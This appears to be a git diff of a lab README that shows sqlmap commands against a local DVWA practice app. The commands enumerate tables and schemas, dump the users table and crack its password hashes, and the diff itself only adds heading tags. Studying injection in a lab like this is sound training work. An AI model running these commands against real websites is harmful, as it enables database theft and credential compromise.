@@ -125,7 +125,7 @@ Password: password
 
 # Using SQLmap
 
-- sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches including database fingerprinting, over data fetching from the database, accessing the underlying file system, and executing commands on the operating system via out-of-band connections.
+- </h5>sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester, and a broad range of switches including database fingerprinting, over data fetching from the database, accessing the underlying file system, and executing commands on the operating system via out-of-band connections.</h5>
 
 <p style="text-align:center;">
 <img src="./PNGs/8.png">
@@ -133,7 +133,7 @@ Password: password
 
 You can use SQLmap to perform various tasks, such as: 
 
-* Viewing all tables on the webpage:
+* <h6>Viewing all tables on the webpage: </h6>
 
 
 ```
@@ -142,14 +142,14 @@ Bash
 cd sqlmap-dev
 sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --tables  
 ```
-* Viewing all table schemas:
+* <h6>Viewing all table schemas:</h6>
 
 ```
 Bash
 
 sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --tables  --schema --batch
 ```
-* Viewing schema for a specific table ('users'):
+* <h6>Viewing schema for a specific table ('users'):</h6>
 ``` 
 Bash
 
@@ -157,13 +157,13 @@ sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submi
 ```
 <p style="text-align:center;"><img src="./PNGs/7.png"></p>
 
-* Viewing table content and cracking password hashes:
+* <h6>Viewing table content and cracking password hashes:</h6>
 
 ``` 
 Bash
 
 sudo python3 sqlmap.py -u "http://127.0.0.1/vulnerabilities/sqli/?id=ahmad&Submit=Submit" --cookie "75o3da5qmsglsquphnpldhqj53; security=low" --dump -T users --batch
 ```
-* outcome: 
+* <h6>outcome: </h6>
 <p style="text-align:center;">
 <img src ="./PNGs/3.png"></p>
